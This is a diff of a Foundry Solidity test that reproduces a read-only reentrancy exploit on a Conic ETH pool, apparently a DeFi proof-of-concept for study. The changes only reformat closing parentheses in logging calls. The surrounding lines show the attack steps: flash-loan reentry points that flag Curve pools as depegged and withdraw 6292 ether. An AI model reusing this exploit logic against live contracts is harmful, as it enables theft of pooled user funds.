@@ -98,7 +98,7 @@ contract ContractTest is Test {
         sellAllTokenToWETH();
         emit log_named_decimal_uint(
             "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
-        );
+            );
     }
 
     function aaveV2Flashloan() internal {
@@ -170,14 +170,14 @@ contract ContractTest is Test {
             "before Read-Only-Reentrancy cbETH_ETH_LP Price",
             Oracle.getUSDPrice(address(cbETH_ETH_LP)),
             cbETH_ETH_LP.decimals()
-        );
+            );
         reenter_2();
 
         emit log_named_decimal_uint(
             "before Read-Only-Reentrancy rETH_ETH_LP Price",
             Oracle.getUSDPrice(address(rETH_ETH_LP)),
             rETH_ETH_LP.decimals()
-        );
+            );
         reenter_3();
 
         // repay flashLoan
@@ -204,7 +204,7 @@ contract ContractTest is Test {
         amount[1] = 0;
         emit log_named_decimal_uint(
             "before Read-Only-Reentrancy steCRV Price", Oracle.getUSDPrice(address(steCRV)), steCRV.decimals()
-        );
+            );
         nonce++;
         LidoCurvePool.remove_liquidity(steCRV.balanceOf(address(this)), amount); // burn steCRV, first reentrancy enter point
     }
@@ -239,24 +239,22 @@ contract ContractTest is Test {
         if (msg.sender != address(WETH)) {
             if (nonce == 1) {
                 emit log_named_decimal_uint(
-                    "In Read-Only-Reentrancy steCRV Price", 
-                    Oracle.getUSDPrice(address(steCRV)), 
-                    steCRV.decimals()
-                );
+                    "In Read-Only-Reentrancy steCRV Price", Oracle.getUSDPrice(address(steCRV)), steCRV.decimals()
+                    );
                 ConicEthPool.handleDepeggedCurvePool(address(LidoCurvePool)); // set LidoCurvePool as depegged pool
             } else if (nonce == 2) {
                 emit log_named_decimal_uint(
                     "In Read-Only-Reentrancy cbETH_ETH_LP Price",
                     Oracle.getUSDPrice(address(cbETH_ETH_LP)),
                     cbETH_ETH_LP.decimals()
-                );
+                    );
                 ConicEthPool.handleDepeggedCurvePool(address(cbETH_ETH_Pool)); // set cbETH_ETH_Pool as depegged pool
             } else if (nonce == 3) {
                 emit log_named_decimal_uint(
                     "In Read-Only-Reentrancy rETH_ETH_LP Price",
                     Oracle.getUSDPrice(address(rETH_ETH_LP)),
                     rETH_ETH_LP.decimals()
-                );
+                    );
                 ConicEthPool.withdraw(6292 ether, 0); // withdraw assets from ConicEthPool
                 nonce++;
             }
